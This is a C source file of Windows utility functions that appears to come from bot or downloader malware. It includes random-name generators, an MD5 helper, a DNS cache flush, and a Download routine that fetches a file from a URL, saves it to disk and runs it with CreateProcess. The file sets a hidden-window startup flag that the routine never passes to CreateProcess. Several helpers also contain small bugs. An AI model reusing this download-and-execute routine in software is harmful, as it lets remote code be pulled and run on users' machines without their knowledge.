#include "Externs.h"
#include "includes.h"

HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}

void RandomString(char *dst,int len,BOOL Gen_Numbers)
{
	int i=0,randn=0;
	
	srand(GetTickCount()); // init random number generator

	do
	{
		randn=(rand() % 90); // gen random number between 0 ~ 90

		if(randn<30 && i!=0 && Gen_Numbers==TRUE)
			dst[i]=(48 + (rand() % 9));		//gen number
		else if(randn<60)
			dst[i]=(98 + (rand() % 24));	//gen lower case letter
		else if(randn>60)
			dst[i]=(66 + (rand() % 24));	//gen upper case letter

		i++;
		len--;

	}while(len!=0);

	dst[i]=NULL;
}


int Download(char *link,char *exxe)
{
	FILE *fp;
	HINTERNET hOpen, hURL;
	char file[99];
	unsigned long read;
	PROCESS_INFORMATION pInfo;
	STARTUPINFO sInfo;
	memset(&sInfo, 0, sizeof(sInfo));
	memset(&pInfo, 0, sizeof(pInfo));
	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW;
	sInfo.wShowWindow = SW_HIDE;
	hOpen = InternetOpen("wget", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
	if (hOpen == NULL) 
		return 0;
	else
		hURL = InternetOpenUrl( hOpen, link, NULL, 0, 0, 0 );
	if (hURL == NULL) 
		return 0;
	else
		fp = fopen(exxe, "wb");
	if (fp!=NULL)
	{
		while(InternetReadFile(hURL, file, sizeof(file) - 1 , &read) && read != 0)
		{
			fwrite(file, sizeof(char), read, fp);
		}
		fclose(fp);
		CreateProcess(NULL, exxe, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
		return 1;
	}
	return 0;
}

BOOL DnsFlushResolverCache()
{
    BOOL (WINAPI *DoDnsFlushResolverCache)();
    *(FARPROC *)&DoDnsFlushResolverCache = GetProcAddress(LoadLibrary("dnsapi.dll"), "DnsFlushResolverCache");
    if(!DoDnsFlushResolverCache) return FALSE;
    return DoDnsFlushResolverCache();
}

char *rndx(int size)
{
	int k;
	char *buf;
	unsigned int ret;

	buf = (char *)malloc(size + 1);
	memset(buf, '\0', size + 1);
	srand((unsigned int)time(NULL));
	for (k = 0; k < size; k++)
	{
		ret = ((rand() % 26) + 97);
		strcat(buf, (const char *)&ret);
	}

	return buf;
}

char *md5_str(char *p)
{
  md5_state_t state;
  md5_byte_t digest[16];
  char *hex_output = (char *)malloc(33);
  int di;
   
  md5_init(&state);
  md5_append(&state, (const md5_byte_t *)p, (int)strlen(p));
  md5_finish(&state, digest);
   
  for (di = 0; di < 16; di++){
    sprintf(hex_output + di * 2, "%02x", digest[di]);
  }   
  return hex_output;
}
